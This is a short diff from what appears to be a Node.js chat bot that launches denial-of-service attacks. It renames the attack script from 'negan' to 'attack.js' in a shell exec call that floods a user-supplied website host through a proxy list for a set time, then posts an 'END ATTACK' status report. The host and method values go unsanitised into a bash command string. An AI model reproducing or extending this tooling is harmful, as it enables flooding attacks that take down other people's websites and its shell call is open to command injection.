@@ -97,7 +97,7 @@ const initBot = () => {
 
             let completedMethods = 0;
             methods.forEach(method => {
-                exec(`node --max-old-space-size=8192 ./negan -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
+                exec(`node --max-old-space-size=8192 ./attack.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                     completedMethods++;
                     if (completedMethods === methods.length) {
                         const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
